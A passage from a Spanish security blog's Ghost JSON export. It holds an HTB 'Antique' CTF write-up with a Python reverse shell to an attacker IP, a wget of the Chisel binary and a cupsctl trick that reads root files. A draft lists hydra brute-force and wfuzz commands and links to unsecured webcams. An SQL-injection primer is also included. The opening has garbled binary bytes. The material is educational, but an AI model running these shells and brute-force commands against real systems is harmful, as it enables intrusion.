P@ssw0rd@123!!123�q��\"2Rbs3CSs��$4�Eu�WGW�(8i\tIY�aA�\"1&1A5# \n\nVaya, vamos a probar P@ssw0rd@123!!123 y ver que pasa.\n\n❯ telnet antique.htb\nTrying 10.10.11.107...\nConnected to antique.htb.\nEscape character is '^]'.\nHP JetDirect\n\nPassword: P@ssw0rd@123!!123\n\nPlease type \"?\" for HELP\n> \n\nProbando distintos datos de entrada, parece que podemos llegar a ejecutar código remotamente. Llegamos incluso a ver que el propio servicio de HP JetDirect es un script de Python por lo que podemos inferir que la máquina es capaz de ejecutar este tipo de archivos.\n\n\n2. Acceso al sistema\n\nPonemos en nuestra máquina un servicio escuchando en el puerto 443 y lanzamos desde la consola de Telnet el siguiente script\n\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.16\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n\nVolvemos a nuestra consola donde estábamos esperando la shell...\n\n❯ nc -lvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.16] from antique.htb [10.10.11.107] 37726\nlp@antique:~$ whoami\nlp\nlp@antique:~$ hostname -I\n10.10.11.107 \nlp@antique:~$ cat user.txt\t\n7d28xxxxxxxxxxxxxxxxxxxxx\n\nPrimera flag obtenida. Estamos dentro.\n\n\n3. Escalado de privilegios\n\nLlegados a este punto, continuamos viendo que puertos hay abiertos en el sistema.\n\nlp@antique:~$ ss -tulpn | grep LISTEN\ntcp     LISTEN   0        4096             0.0.0.0:631           0.0.0.0:*\ntcp     LISTEN   0        128              0.0.0.0:23            0.0.0.0:* users:((\"python3\",pid=828,fd=3))\ntcp     LISTEN   0        4096                [::]:631              [::]:*\n\nSi hacemos curl al puerto 631 desde la máquina atacada vemos una web de CUPS que no es accesible desde nuestro sistema, por lo que no podemos ver nada desde nuestra máquina.\n\nPara trabajar un poco más cómodos, es necesario hacer pivoting. Personalmente, me gusta utilizar ssh para crear un túnel, pero en este caso no tenemos acceso por ssh ni podemos conseguirlo ejecutando un ssh-keygen al no estar instalado en el sistema atacado.\n\nExiste una herramienta denominada Chisel que nos permite conseguir lo mismo sin necesitar permisos de root ni de nada.\n\nProcedemos a compilarla en nuestra máquina y lanzamos el servidor en modo reverse, para dejarle al cliente escoger el puerto desde el cual quiere crear el túnel.\n\n❯ git clone https://github.com/jpillora/chisel\n❯ cd chisel && go build -ldflags=\"-s -w\"\n❯ sudo ./chisel server -p 8000 --reverse\n\nUna vez hecho esto, procedemos a enviar el binario a la máquina atacada con el fin de poder ejecutarlo también. Levantamos un servidor en el puerto 8080 con Python.\n\n❯ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n\nY en el servidor remoto, nos lo descargamos con wget y le damos permisos de ejecución para conectarnos al otro extremo.\n\nlp@antique:~$ wget 10.10.14.16:8080/chisel\n...\nchisel              100%[===================>]   7.75M  5.53MB/s    in 1.4s\n2022-01-30 12:52:20 (5.53 MB/s) - ‘chisel’ saved [8130560/8130560]\nlp@antique:~$ chmod +x chisel\nlp@antique:~$ ./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631\n./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631\n2022/01/30 12:55:03 client: Connecting to ws://10.10.14.16:8000\n2022/01/30 12:55:03 client: Connected (Latency 43.929004ms)\n\nAbrimos un navegador desde nuestro sistema et voilà.\n\nLo siguiente que podemos hacer es buscar vulnerabilidades para la versión 1.6.1 de CUPS. Y nos encontramos ante la siguiente vulnerabilidad y el siguiente exploit. Es un post de un script de Metasploit que en principio lo vamos a utilizar para entender que hace. Generalmente, estos scripts hacen tareas muy simples y es interesante examinarlos para aprender más aún de ellos. En este caso, la vulnerabilidad se basa en un problema dentro del módulo de administración>ver archivo de registro de error en CUPS.\n\nEste módulo imprime por pantalla la ubicación del log de error. Además, aquellos usuarios del grupo lpadmin son capaces de modificar dicha ubicación con el comando cupsctl. Comprobamos que pertenecemos a dicho grupo.\n\nlp@antique:~$ id\nuid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)\n\nY procedemos a modificar la ruta a la que queremos acceder con el siguiente comando.\n\nlp@antique:~$ cupsctl ErrorLog=\"/root/root.txt\"\n\nNos aseguramos que seguimos manteniendo el túnel de Chisel activo y vamos al navegador para revisar el módulo de error de CUPS.\n\nAhí está el flag de root. He tenido que recargar la página asegurándome de no cachear la respuesta, ya que al principio no era capaz de ver el resultado. Con esto finalizamos la máquina.\n\n\nConclusión\n\nEsta máquina se nota que es de dificultad fácil aunque no es trivial el escalado de privilegios final si no has trabajado antes con impresoras en Linux. Ha sido necesario investigar el funcionamiento de los scripts de Metasploit para no alargar mucho la resolución de la misma y aunque finalmente solo tienes acceso a leer archivos de la máquina y no es un escalado de privilegios real, podemos darla por terminada.",
            "feature_image": "__GHOST_URL__/content/images/2022/01/Screenshot_1-1.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-01-30T00:13:54.000Z",
            "updated_at": "2022-02-01T18:46:50.000Z",
            "published_at": "2022-01-30T00:16:00.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c10057530148112375",
            "uuid": "1b1bb7e5-04d1-4006-b577-76330e2cca44",
            "title": "Ideas de post",
            "slug": "ideas-de-post",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"powershell\",\"code\":\"wfuzz -c --hc=404,301 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://soccer.htb/tiny/uploads/FUZZ/\"}],[\"code\",{\"language\":\"powershell\",\"code\":\"hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/2020-200_most_used_passwords.txt soccer.htb http-post-form \\\"/tiny/:fm_usr=^USER^&fm_pwd=^PASS^:Invalid username or password\\\"\"}]],\"markups\":[[\"a\",[\"href\",\"https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/\"]],[\"a\",[\"href\",\"https://twitter.com/TakSec/status/1609650609640312832\"]],[\"a\",[\"href\",\"https://geoxc-apps.bd.esri.com/space/satellite-explorer/\"]],[\"a\",[\"href\",\"https://satellitemap.space/?constellation=starlink&norad=50188\"]],[\"a\",[\"href\",\"http://www.insecam.org/en/bycountry/ES/?page=8\"]],[\"a\",[\"href\",\"https://world-webcams.nsspot.net/\"]],[\"a\",[\"href\",\"https://nixintel.info/osint/12-osint-resources-for-e-mail-addresses/\"]],[\"a\",[\"href\",\"https://www.futurespace.es/fs-osint/\"]],[\"a\",[\"href\",\"https://browserleaks.com/\"]],[\"a\",[\"href\",\"https://coveryourtracks.eff.org/\"]],[\"a\",[\"href\",\"https://clearbit.com/customers\"]],[\"a\",[\"href\",\"https://www.softzone.es/2015/04/08/clearbit-software-detras-direccion-email/\"]],[\"a\",[\"href\",\"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection\"]]],\"sections\":[[3,\"ul\",[[[0,[],0,\"Hablar sobre trivy y escaneadores de vulnerabilidades. Por ejemplo el contenedor de python:3.11 tiene vulnerabilidades un monton pero el de alpine no.\"]],[[0,[],0,\"\\t\\ttrivy image --ignore-unfixed --severity HIGH python:3.11\"]],[[0,[],0,\"\\t\\ttrivy image --ignore-unfixed --severity HIGH python:3.11-alpine\"]],[[0,[],0,\"Post sobre Osint, google dorks\"]],[[0,[0],1,\"https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/\"]],[[0,[1],1,\"https://twitter.com/TakSec/status/1609650609640312832\"]],[],[[0,[],0,\"Post sobre OSINT\"]],[[0,[2],1,\"https://geoxc-apps.bd.esri.com/space/satellite-explorer/\"],[0,[],0,\" Aqui puedo hablar del proposito de los satelites, tipos de orbitas, dueños y basura espacial\"]],[[0,[3],1,\"https://satellitemap.space/?constellation=starlink&norad=50188\"],[0,[],0,\" lo puedo incluir en el de arriba para hablar de starlinkt\"]],[[0,[],0,\"----\"]],[[0,[],0,\"Webcams sin contraseña \"],[0,[4],1,\"http://www.insecam.org/en/bycountry/ES/?page=8\"]],[[0,[5],1,\"https://world-webcams.nsspot.net/\"]],[[0,[],0,\"buscar en shodan a ver si hay algun google dork para sacar passwords default\"]],[[0,[],0,\"Emails: \"],[0,[6],1,\"https://nixintel.info/osint/12-osint-resources-for-e-mail-addresses/\"]],[[0,[],0,\"Business and personal fingerprinting: \"],[0,[7],1,\"https://www.futurespace.es/fs-osint/\"],[0,[],0,\", esta web te muestra el leak de informacion que da tu navegador cuando visitas cualquier web \"],[0,[8],1,\"https://browserleaks.com/\"],[0,[],0,\". este te hace un test de cuanto seguro es tu browser \"],[0,[9],1,\"https://coveryourtracks.eff.org/\"]],[[0,[10],1,\"https://clearbit.com/customers\"],[0,[],0,\" esta antes dabas un mail y te sacaba informacion de la persona, gustos, donde esta registrado... se ve que han cambiado un poco para que de \\\"menos\\\" miedo. Este post de 2015 lo confirma \"],[0,[11],1,\"https://www.softzone.es/2015/04/08/clearbit-software-detras-direccion-email/\"],[0,[],0,\". Estas webs infieren la identidad de un mail mirando en internet, cookies,...\"]]]],[1,\"p\",[]],[3,\"ul\",[[[0,[],0,\"Post sobre fuzzing de uris\"]]]],[10,0],[3,\"ul\",[[[0,[],0,\"fuzzing dns fuzz.web.com\"]],[[0,[],0,\"fuzzing  web.com/fuzz/\"]],[[0,[],0,\"fuzzing web.com/directory/fuzz.php\"]]]],[1,\"p\",[]],[3,\"ul\",[[[0,[],0,\"Post sobre fuerza bruta con hydra\"]]]],[10,1],[3,\"ul\",[[],[[0,[],0,\"Pivoting con ssh, chisel\"]],[[0,[],0,\"como funcitona tcp y https\"]],[[0,[],0,\"Reconocimiento con nmap, script custom de python\"]],[[0,[],0,\"Monitorizacion de procesos con ps-aux, pspy,\"]],[[0,[],0,\"Escalado de privilegios suid\"]],[[0,[],0,\"Reconocimiento de directorios con dirbuster, wfuzz\"]],[[0,[],0,\"Trabajar con burpsuite para capturar peticiones y reenviarlas añadiendo una cookie de sesion\"]],[[0,[],0,\"Pensar en cosas de docker que pueda enseñar\"]],[[0,[],0,\"Almacenar contraseñas de forma segura en una db\"]],[[0,[],0,\"ejecucion remota de codigo a traves de la plantilla de jinja cros side remote templtate \"],[0,[12],1,\"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection\"]],[[0,[],0,\"Explicar arp poisoning MITM\"]]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<ul><li>Hablar sobre trivy y escaneadores de vulnerabilidades. Por ejemplo el contenedor de python:3.11 tiene vulnerabilidades un monton pero el de alpine no.</li><li>  trivy image --ignore-unfixed --severity HIGH python:3.11</li><li>  trivy image --ignore-unfixed --severity HIGH python:3.11-alpine</li><li>Post sobre Osint, google dorks</li><li><a href=\"https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/\">https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/</a></li><li><a href=\"https://twitter.com/TakSec/status/1609650609640312832\">https://twitter.com/TakSec/status/1609650609640312832</a></li><li></li><li>Post sobre OSINT</li><li><a href=\"https://geoxc-apps.bd.esri.com/space/satellite-explorer/\">https://geoxc-apps.bd.esri.com/space/satellite-explorer/</a> Aqui puedo hablar del proposito de los satelites, tipos de orbitas, dueños y basura espacial</li><li><a href=\"https://satellitemap.space/?constellation=starlink&amp;norad=50188\">https://satellitemap.space/?constellation=starlink&amp;norad=50188</a> lo puedo incluir en el de arriba para hablar de starlinkt</li><li>----</li><li>Webcams sin contraseña <a href=\"http://www.insecam.org/en/bycountry/ES/?page=8\">http://www.insecam.org/en/bycountry/ES/?page=8</a></li><li><a href=\"https://world-webcams.nsspot.net/\">https://world-webcams.nsspot.net/</a></li><li>buscar en shodan a ver si hay algun google dork para sacar passwords default</li><li>Emails: <a href=\"https://nixintel.info/osint/12-osint-resources-for-e-mail-addresses/\">https://nixintel.info/osint/12-osint-resources-for-e-mail-addresses/</a></li><li>Business and personal fingerprinting: <a href=\"https://www.futurespace.es/fs-osint/\">https://www.futurespace.es/fs-osint/</a>, esta web te muestra el leak de informacion que da tu navegador cuando visitas cualquier web <a href=\"https://browserleaks.com/\">https://browserleaks.com/</a>. este te hace un test de cuanto seguro es tu browser <a href=\"https://coveryourtracks.eff.org/\">https://coveryourtracks.eff.org/</a></li><li><a href=\"https://clearbit.com/customers\">https://clearbit.com/customers</a> esta antes dabas un mail y te sacaba informacion de la persona, gustos, donde esta registrado... se ve que han cambiado un poco para que de \"menos\" miedo. Este post de 2015 lo confirma <a href=\"https://www.softzone.es/2015/04/08/clearbit-software-detras-direccion-email/\">https://www.softzone.es/2015/04/08/clearbit-software-detras-direccion-email/</a>. Estas webs infieren la identidad de un mail mirando en internet, cookies,...</li></ul><p></p><ul><li>Post sobre fuzzing de uris</li></ul><pre><code class=\"language-powershell\">wfuzz -c --hc=404,301 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://soccer.htb/tiny/uploads/FUZZ/</code></pre><ul><li>fuzzing dns fuzz.web.com</li><li>fuzzing  web.com/fuzz/</li><li>fuzzing web.com/directory/fuzz.php</li></ul><p></p><ul><li>Post sobre fuerza bruta con hydra</li></ul><pre><code class=\"language-powershell\">hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/2020-200_most_used_passwords.txt soccer.htb http-post-form \"/tiny/:fm_usr=^USER^&amp;fm_pwd=^PASS^:Invalid username or password\"</code></pre><ul><li></li><li>Pivoting con ssh, chisel</li><li>como funcitona tcp y https</li><li>Reconocimiento con nmap, script custom de python</li><li>Monitorizacion de procesos con ps-aux, pspy,</li><li>Escalado de privilegios suid</li><li>Reconocimiento de directorios con dirbuster, wfuzz</li><li>Trabajar con burpsuite para capturar peticiones y reenviarlas añadiendo una cookie de sesion</li><li>Pensar en cosas de docker que pueda enseñar</li><li>Almacenar contraseñas de forma segura en una db</li><li>ejecucion remota de codigo a traves de la plantilla de jinja cros side remote templtate <a href=\"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection\">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li><li>Explicar arp poisoning MITM</li></ul>",
            "comment_id": "61f6978eea41b50061752cc2",
            "plaintext": " * Hablar sobre trivy y escaneadores de vulnerabilidades. Por ejemplo el contenedor de python:3.11 tiene vulnerabilidades un monton pero el de alpine no.\n *   trivy image --ignore-unfixed --severity HIGH python:3.11\n *   trivy image --ignore-unfixed --severity HIGH python:3.11-alpine\n * Post sobre Osint, google dorks\n * https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/\n * https://twitter.com/TakSec/status/1609650609640312832\n * \n * Post sobre OSINT\n * https://geoxc-apps.bd.esri.com/space/satellite-explorer/ Aqui puedo hablar del proposito de los satelites, tipos de orbitas, dueños y basura espacial\n * https://satellitemap.space/?constellation=starlink&norad=50188 lo puedo incluir en el de arriba para hablar de starlinkt\n * ----\n * Webcams sin contraseña http://www.insecam.org/en/bycountry/ES/?page=8\n * https://world-webcams.nsspot.net/\n * buscar en shodan a ver si hay algun google dork para sacar passwords default\n * Emails: https://nixintel.info/osint/12-osint-resources-for-e-mail-addresses/\n * Business and personal fingerprinting: https://www.futurespace.es/fs-osint/, esta web te muestra el leak de informacion que da tu navegador cuando visitas cualquier web https://browserleaks.com/. este te hace un test de cuanto seguro es tu browser https://coveryourtracks.eff.org/\n * https://clearbit.com/customers esta antes dabas un mail y te sacaba informacion de la persona, gustos, donde esta registrado... se ve que han cambiado un poco para que de \"menos\" miedo. Este post de 2015 lo confirma https://www.softzone.es/2015/04/08/clearbit-software-detras-direccion-email/. Estas webs infieren la identidad de un mail mirando en internet, cookies,...\n\n\n\n * Post sobre fuzzing de uris\n\nwfuzz -c --hc=404,301 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://soccer.htb/tiny/uploads/FUZZ/\n\n * fuzzing dns fuzz.web.com\n * fuzzing  web.com/fuzz/\n * fuzzing web.com/directory/fuzz.php\n\n\n\n * Post sobre fuerza bruta con hydra\n\nhydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/2020-200_most_used_passwords.txt soccer.htb http-post-form \"/tiny/:fm_usr=^USER^&fm_pwd=^PASS^:Invalid username or password\"\n\n * \n * Pivoting con ssh, chisel\n * como funcitona tcp y https\n * Reconocimiento con nmap, script custom de python\n * Monitorizacion de procesos con ps-aux, pspy,\n * Escalado de privilegios suid\n * Reconocimiento de directorios con dirbuster, wfuzz\n * Trabajar con burpsuite para capturar peticiones y reenviarlas añadiendo una cookie de sesion\n * Pensar en cosas de docker que pueda enseñar\n * Almacenar contraseñas de forma segura en una db\n * ejecucion remota de codigo a traves de la plantilla de jinja cros side remote templtate https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection\n * Explicar arp poisoning MITM",
            "feature_image": null,
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-01-30T13:50:06.000Z",
            "updated_at": "2023-05-02T19:12:20.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c10057530148112376",
            "uuid": "9725160c-befc-42e0-812a-0abff34c4259",
            "title": "SQL Injection para Dummies",
            "slug": "sql-injection-para-dummies",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\" |          | Login form         |\\n |----------|--------------------|\\n | Username | John               |\\n | Password | 1234\\\" or 1=1;--    |\",\"language\":\"markdown\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/sqli.svg\",\"width\":761,\"height\":174,\"caption\":\"SQL Injection schema\"}],[\"code\",{\"language\":\"bash\",\"code\":\"git clone https://github.com/iocio005/flask-sqlinjection-vulnerable\\ndocker-compose -f flask-sqlinjection-vulnerable/docker-compose.yml up\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/ezgif.com-gif-maker.gif\",\"width\":600,\"height\":503}]],\"markups\":[[\"a\",[\"href\",\"https://es.wikipedia.org/wiki/SQL\"]],[\"a\",[\"href\",\"https://www.incibe.es/protege-tu-empresa/blog/ataques-inyeccion-sql-amenaza-tu-web\"]],[\"a\",[\"href\",\"https://www.pandasecurity.com/es/mediacenter/seguridad/asi-se-estan-endureciendo-en-espana-las-penas-contra-los-ciberdelincuentes/\"]],[\"a\",[\"href\",\"https://github.com/iocio005/flask-sqlinjection-vulnerable\"]],[\"a\",[\"href\",\"http://127.0.0.1\"]],[\"a\",[\"href\",\"https://letmegooglethat.com/?q=How+to+prevent+sqli+csharp\"]],[\"a\",[\"href\",\"https://letmegooglethat.com/?q=How+to+prevent+sqli+python\"]],[\"a\",[\"href\",\"https://letmegooglethat.com/?q=How+to+prevent+sqli+java\"]],[\"a\",[\"href\",\"https://letmegooglethat.com/?q=How+to+prevent+sqli+php\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"En este post vamos a hablar de SQL Injection o inyección SQL, para los más hispanohablantes.\"]]],[1,\"p\",[[0,[],0,\"Antes de nada, si estás muy perdido, vamos a explicar qué es SQL o Structured Query Language. SQL se utiliza para que, los desarrolladores de software en su mayoría, nos comuniquemos con las diferentes bases de datos dentro de nuestro código. Es un lenguaje estándar para sistemas de bases de datos relaciones. Te dejo un \"],[0,[0],1,\"link\"],[0,[],0,\" a Wikipedia y otro a la web de \"],[0,[1],1,\"INCIBE \"],[0,[],0,\"(Instituto Nacional de CIBErseguridad) por si tienes más curiosidad.\"]]],[1,\"p\",[[0,[],0,\"Después de esta breve introducción, al lío.\"]]],[1,\"p\",[[0,[],0,\"Cuando hablamos concretamente de las inyecciones SQL, estamos hablando de un tipo de ciberataque que se puede dar en cualquier plataforma digital que maneje por detrás una base de datos. Poneos a pensar y os daréis cuenta de que es más rápido si tratáis de enumerar qué sistema digital no se sustenta por detrás por una o más bases de datos y así podéis imaginar cuan sensible es este tema.\"]]],[1,\"p\",[[0,[],0,\"Aquellas potenciales plataformas que son sensibles a este tipo de ciberataque son aquellas (entre otras muchas) que manejan formularios y permiten introducir al usuario algún tipo de información. Si llegados a este punto te estás perdiendo, un formulario es lo que usas para meter tu usuario y contraseña de Netflix.\"]]],[1,\"p\",[[0,[],0,\"Y es que con esto, un hacker podría insertar código propio en una plataforma vulnerable y acceder a todo tipo de información protegida. Desde información relativa de los usuarios, hasta enumerar las distintas bases de datos que hay dentro de una organización.\"]]],[1,\"p\",[[0,[],0,\"En un mundo ideal, un usuario inserta una contraseña (1234) en un formulario de entrada. Pero, ¿que pasaría si un usuario introdujera lo siguiente en un servidor vulnerable?\"]]],[10,0],[1,\"p\",[[0,[],0,\"A continuación vemos un esquema del funcionamiento de un ataque de este estilo.\"]]],[10,1],[1,\"blockquote\",[[0,[],0,\"Probar cualquier acción de este tipo en un entorno que no nos pertenece, está duramente penado por la ley. En ningún caso deberíamos probar esto en las plataformas. Incluso el \"],[0,[2],1,\"Hacking Ético\"],[0,[],0,\", sin permiso de la empresa responsable de la plataforma, es ilegal.\"]]],[3,\"ol\",[[[0,[],0,\"Un atacante inserta una contraseña. (1234\\\" or 1=1;--)\"]],[[0,[],0,\"Esa cadena de caracteres viaja al servidor y se sustituye dentro de la cláusula WHERE de la sentencia SQL.\"]],[[0,[],0,\"La sentencia WHERE hace de filtro. La idea es que devuelva aquellos usuarios que cumplen con la condición. En este caso, la condición booleana es verdadera en el operando derecho de la cláusula OR.\"]],[[0,[],0,\"Como siempre se cumple la condición, existe una fuga de información.\"]]]],[1,\"p\",[[0,[],0,\"He preparado una prueba de concepto en mi \"],[0,[3],1,\"repositorio \"],[0,[],0,\"que puedes ejecutar con los siguientes comandos en un entorno con Docker instalado.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Abre un navegador, entra a \"],[0,[4],1,\"http://127.0.0.1\"],[0,[],0,\" y extrae toda la información que puedas, como se ve a continuación.\"]]],[10,3],[1,\"p\",[[0,[],0,\"La mayoría de las plataformas están exentas de este tipo de vulnerabilidades, aunque siempre aparecen casos nuevos que necesitan ser parcheados.\"]]],[1,\"p\",[[0,[],0,\"Si eres desarrollador y quieres asegurarte de que en tu código no introduces este tipo de vulnerabilidades, probablemente estés exento de ellas si utilizas algún ORM o Framework. En cualquier caso, investiga los siguientes enlaces con el fin de prevenir estas vulnerabilidades en diferentes lenguajes:\"]]],[3,\"ul\",[[[0,[5],1,\"C#\"]],[[0,[6],1,\"Python\"]],[[0,[7],1,\"Java\"]],[[0,[8],1,\"Php\"]]]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>En este post vamos a hablar de SQL Injection o inyección SQL, para los más hispanohablantes.</p><p>Antes de nada, si estás muy perdido, vamos a explicar qué es SQL o Structured Query Language. SQL se utiliza para que, los desarrolladores de software en su mayoría, nos comuniquemos con las diferentes bases de datos dentro de nuestro código. Es un lenguaje estándar para sistemas de bases de datos relaciones. Te dejo un <a href=\"https://es.wikipedia.org/wiki/SQL\">link</a> a Wikipedia y otro a la web de <a href=\"https://www.incibe.es/protege-tu-empresa/blog/ataques-inyeccion-sql-amenaza-tu-web\">INCIBE </a>(Instituto Nacional de CIBErseguridad) por si tienes más curiosidad.</p><p>Después de esta breve introducción, al lío.</p><p>Cuando hablamos concretamente de las inyecciones SQL, estamos hablando de un tipo de ciberataque que se puede dar en cualquier plataforma digital que maneje por detrás una base de datos. Poneos a pensar y os daréis cuenta de que es más rápido si tratáis de enumerar qué sistema digital no se sustenta por detrás por una o más bases de datos y así podéis imaginar cuan sensible es este tema.</p><p>Aquellas potenciales plataformas que son sensibles a este tipo de ciberataque son aquellas (entre otras muchas) que manejan formularios y permiten introducir al usuario algún tipo de información. Si llegados a este punto te estás perdiendo, un formulario es lo que usas para meter tu usuario y contraseña de Netflix.</p><p>Y es que con esto, un hacker podría insertar código propio en una plataforma vulnerable y acceder a todo tipo de información protegida. Desde información relativa de los usuarios, hasta enumerar las distintas bases de datos que hay dentro de una organización.</p><p>En un mundo ideal, un usuario inserta una contraseña (1234) en un formulario de entrada. Pero, ¿que pasaría si un usuario introdujera lo siguiente en un servidor vulnerable?</p><pre><code class=\"language-markdown\"> |          | Login form         |\n |----------|--------------------|\n | Username | John               |\n | Password | 1234\" or 1=1;--    |</code></pre><p>A continuación vemos un esquema del funcionamiento de un ataque de este estilo.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/01/sqli.svg\" class=\"kg-image\" alt loading=\"lazy\" width=\"761\" height=\"174\"><figcaption>SQL Injection schema</figcaption></figure><blockquote>Probar cualquier acción de este tipo en un entorno que no nos pertenece, está duramente penado por la ley. En ningún caso deberíamos probar esto en las plataformas. Incluso el <a href=\"https://www.pandasecurity.com/es/mediacenter/seguridad/asi-se-estan-endureciendo-en-espana-las-penas-contra-los-ciberdelincuentes/\">Hacking Ético</a>, sin permiso de la empresa responsable de la plataforma, es ilegal.</blockquote><ol><li>Un atacante inserta una contraseña. (1234\" or 1=1;--)</li><li>Esa cadena de caracteres viaja al servidor y se sustituye dentro de la cláusula WHERE de la sentencia SQL.</li><li>La sentencia WHERE hace de filtro. La idea es que devuelva aquellos usuarios que cumplen con la condición. En este caso, la condición booleana es verdadera en el operando derecho de la cláusula OR.</li><li>Como siempre se cumple la condición, existe una fuga de información.</li></ol><p>He preparado una prueba de concepto en mi <a href=\"https://github.com/iocio005/flask-sqlinjection-vulnerable\">repositorio </a>que puedes ejecutar con los siguientes comandos en un entorno con Docker instalado.</p><pre><code class=\"language-bash\">git clone https://github.com/iocio005/flask-sqlinjection-vulnerable\ndocker-compose -f flask-sqlinjection-vulnerable/docker-compose.yml up</code></pre><p>Abre un navegador, entra a <a href=\"http://127.0.0.1\">http://127.0.0.1</a> y extrae toda la información que puedas, como se ve a continuación.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/01/ezgif.com-gif-maker.gif\" class=\"kg-image\" alt loading=\"lazy\" width=\"600\" height=\"503\" srcset=\"__GHOST_URL__/content/images/2022/01/ezgif.com-gif-maker.gif 600w\"></figure><p>La mayoría de las plataformas están exentas de este tipo de vulnerabilidades, aunque siempre aparecen casos nuevos que necesitan ser parcheados.</p><p>Si eres desarrollador y quieres asegurarte de que en tu código no introduces este tipo de vulnerabilidades, probablemente estés exento de ellas si utilizas algún ORM o Framework. En cualquier caso, investiga los siguientes enlaces con el fin de prevenir estas vulnerabilidades en diferentes lenguajes:</p><ul><li><a href=\"https://letmegooglethat.com/?q=How+to+prevent+sqli+csharp\">C#</a></li><li><a href=\"https://letmegooglethat.com/?q=How+to+prevent+sqli+python\">Python</a></li><li><a href=\"https://letmegooglethat.com/?q=How+to+prevent+sqli+java\">Java</a></li><li><a href=\"https://letmegooglethat.com/?q=How+to+prevent+sqli+php\">Php</a></li></ul>",
            "comment_id": "61f6f77eea41b50061752cda",
            "plaintext": "En este post vamos a hablar de SQL Injection o inyección SQL, para los más hispanohablantes.\n\nAntes de nada, si estás muy perdido, vamos a explicar qué es SQL o Structured Query Language. SQL se utiliza para que, los desarrolladores de software en su mayoría, nos comuniquemos con las diferentes bases de datos dentro de nuestro código. Es un lenguaje estándar para sistemas de bases de datos relaciones. Te dejo un link a Wikipedia y otro a la web de INCIBE (Instituto Nacional de CIBErseguridad) por si tienes más curiosidad.\n\nDespués de esta breve introducción, al lío.\n\nCuando hablamos concretamente de las inyecciones SQL, estamos hablando de un tipo de ciberataque que se puede dar en cualquier plataforma digital que maneje por detrás una base de datos. Poneos a pensar y os daréis cuenta de que es más rápido si tratáis de enumerar qué sistema digital no se sustenta por detrás por una o más bases de datos y así podéis imaginar cuan sensible es este tema.\n\nAquellas potenciales plataformas que son sensibles a este tipo de ciberataque son aquellas (entre otras muchas) que manejan formularios y permiten introducir al usuario algún tipo de información. Si llegados a este punto te estás perdiendo, un formulario es lo que usas para meter tu usuario y contraseña de Netflix.\n\nY es que con esto, un hacker podría insertar código propio en una plataforma vulnerable y acceder a todo tipo de información protegida. Desde información relativa de los usuarios, hasta enumerar las distintas bases de datos que hay dentro de una organización.\n\nEn un mundo ideal, un usuario inserta una contraseña (1234) en un formulario de entrada. Pero, ¿que pasaría si un usuario introdujera lo siguiente en un servidor vulnerable?\n\n |          | Login form         |\n |----------|--------------------|\n | Username | John               |\n | Password | 1234\" or 1=1;--    |\n\nA continuación vemos un esquema del funcionamiento de un ataque de este estilo.\n\nProbar cualquier acción de este tipo en un entorno que no nos pertenece, está duramente penado por la ley. En ningún caso deberíamos probar esto en las plataformas. Incluso el Hacking Ético, sin permiso de la empresa responsable de la plataforma, es ilegal.\n\n 1. Un atacante inserta una contraseña. (1234\" or 1=1;--)\n 2. Esa cadena de caracteres viaja al servidor y se sustituye dentro de la cláusula WHERE de la sentencia SQL.\n 3. La sentencia WHERE hace de filtro. La idea es que devuelva aquellos usuarios que cumplen con la condición. En este caso, la condición booleana es verdadera en el operando derecho de la cláusula OR.\n 4. Como siempre se cumple la condición, existe una fuga de información.\n\nHe preparado una prueba de concepto en mi repositorio que puedes ejecutar con los siguientes comandos en un entorno con Docker instalado.\n\ngit clone 